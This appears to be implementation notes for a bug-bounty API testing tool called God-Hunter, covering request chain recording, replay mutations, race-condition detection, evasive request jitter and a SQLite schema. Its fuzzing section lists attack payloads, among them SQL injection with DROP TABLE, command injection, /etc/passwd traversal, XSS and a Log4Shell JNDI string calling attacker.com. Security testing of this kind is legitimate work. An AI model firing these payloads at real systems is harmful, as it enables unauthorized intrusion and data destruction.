# API Module Implementation Notes

## Core Components

### 1. Chain Recording (`api:record`)
- Intercepts HTTP requests (manual or via proxy)
- Stores requests in sequence with timing metadata
- Creates unique chain ID for session
- Extracts parameters for downstream fuzzing

**Schema:**
```
Chain
├── id (chain_*)
├── session_id
├── requests[]
│   ├── method (GET, POST, etc.)
│   ├── url
│   ├── headers (JSON)
│   ├── body
│   ├── response_status
│   ├── response_body
│   └── timing_ms
└── vulnerabilities_found
```

### 2. Chain Replay (`api:replay`)
- Retrieves stored chain from database
- Applies optional mutation strategy
- Compares responses for anomalies
- Detects timing-based vulnerabilities

**Mutation Strategies:**
- **Race**: Send all requests concurrently (no sequential dependencies)
- **Order**: Reverse request sequence to detect state bypasses
- **Param**: Inject payloads into extracted parameters
- **Timing**: Add random delays to test time-dependent logic

### 3. Fuzzing (`api:fuzz`)
- Generates 20+ standard payloads (OWASP top 10)
- Tests single parameter per request
- Detects anomalies (5xx errors, 429/403/401)
- Stores findings with severity classification

**Payload Categories:**
- SQL Injection: `' OR '1'='1`, `"; DROP TABLE users; --`
- Command Injection: `;whoami`, `$(whoami)`, `` `whoami` ``
- Path Traversal: `../../../etc/passwd`
- XSS: `<script>alert(1)</script>`
- Template Injection: `{{7*7}}`, `#{7*7}`, `${7*7}`
- Log4Shell: `${jndi:ldap://attacker.com/a}`

### 4. Chain Building (`api:chain`)
- Interactive or YAML-driven sequence definition
- Handles parameter extraction between steps
- Supports conditional logic (if response.status == 200)
- Records entire workflow for mutation testing

**Example Workflow:**
```yaml
chain:
  name: "admin_privilege_escalation"
  requests:
    - name: auth
      method: POST
      url: /auth
      body: {"user":"test","pass":"test"}
    - name: create_resource
      method: POST
      url: /resource
      body: {"name":"test_resource"}
    - name: escalate_as_admin
      method: PATCH
      url: /resource/{create_resource.id}
      body: {"admin":true}
```

### 5. Race Detection (`api:race`)
- Sends N concurrent requests to same endpoint
- Repeats M times to gather statistics
- Detects response code variance (indicator of race condition)
- Calculates timing deviation (σ) for anomaly detection

**Detection Algorithm:**
```
For each iteration (0 to M):
  Launch N concurrent requests
  Collect response times and status codes
  
If concurrent iterations show:
  - Inconsistent status codes → RACE_CONDITION (HIGH)
  - Timing deviation > 2σ → TIMING_ANOMALY (MEDIUM)
  - Pattern repeats → Vulnerability confirmed
```

## HTTP Engine (`internal/http/client.go`)

### Jitter Engine
```go
// Default: 800-2400ms random delay before each request
delay := rand.Intn(maxMs - minMs) + minMs
time.Sleep(time.Duration(delay) * time.Millisecond)
```

### User-Agent Rotation
Rotates between 5 realistic browser profiles:
- Chrome (Windows, macOS, Linux)
- Firefox (Windows, macOS)
- Safari (macOS)

### Proxy Support
```bash
./god-hunter api record <url> --proxy localhost:8080
```

Automatically routes all requests through upstream proxy for:
- Interactive request modification
- Network traffic inspection
- Integration with Burp Suite

## Database Schema (`internal/db/store.go`)

**Primary Tables:**
- `sessions` — Session metadata and scope
- `chains` — Request sequences
- `requests` — Individual HTTP pairs
- `findings` — Discovered vulnerabilities
- `wordlists_entries` — Auto-extracted parameters

**Indexes:**
- `idx_chains_session` — Fast session lookups
- `idx_requests_chain` — Fast chain request iteration
- `idx_findings_session` — Fast finding aggregation

**Foreign Keys:**
- `findings.session_id` → `sessions.id`
- `chains.session_id` → `sessions.id`
- `requests.chain_id` → `chains.id`

## Session Management (`internal/session/session.go`)

**Lifecycle:**
1. Create session with `NewSession(id, target, program, platform)`
2. Generate unique IDs for chains/requests/findings
3. Store in SQLite at `~/.god-hunter/sessions.db`
4. Session persists across tool restarts
5. Export findings to JSON/Markdown

**ID Generation:**
```go
// Deterministic but unique per operation
hash := sha256.Sum256([]byte(sessionID + endpoint + timestamp))
chainID := "chain_" + hex.EncodeToString(hash[:8])
```

## Impact Theory

### Why Automated Scanners Miss These

1. **Race Conditions**
   - Require concurrent execution (most scanners are sequential)
   - Timing-dependent behavior difficult to detect
   - Affects business logic, not just injection points

2. **TOCTOU (Time-of-Check-Time-of-Use)**
   - Check at T0, modify at T1+δ
   - Scanners test in isolation, don't replay sequences
   - Real impact only visible in chains

3. **Parameter-Order Dependencies**
   - Request A must complete before B for bypass
   - Scanners don't maintain request ordering
   - God-Hunter records and replays actual sequences

4. **Timing-Based Logic**
   - Endpoints behave differently under load
   - Rate limiting can mask vulnerabilities
   - Jitter engine helps fingerprint timing-dependent flaws

### Bounty Potential

**Race Condition in Transaction Processing**: $5k-$10k
- Concurrent withdrawal requests that both succeed
- Final balance inconsistent with transaction log

**IDOR via Race Condition**: $3k-$7k
- Transfer funds between accounts via race
- Authorization checked at step 1, executed at step 2

**Admin Privilege Escalation via Order Bypass**: $5k-$15k
- Create role, assign permissions, escalate concurrently
- Final state grants admin access

## Testing Verification

**Functional Test:**
```bash
./god-hunter api record https://www.google.com --session test_001
# Output should show:
# [+] Recorded request to https://www.google.com (Status: 200, Time: Xms)
# [+] Chain ID: chain_*
# [+] Session ID: test_001
```

**Database Verification:**
```bash
sqlite3 ~/.god-hunter/sessions.db "SELECT * FROM sessions;"
sqlite3 ~/.god-hunter/sessions.db "SELECT * FROM chains;"
sqlite3 ~/.god-hunter/sessions.db "SELECT * FROM requests;"
```

---

**God-Hunter API Module v1.0** — Stateful exploitation framework for bug bounty research.
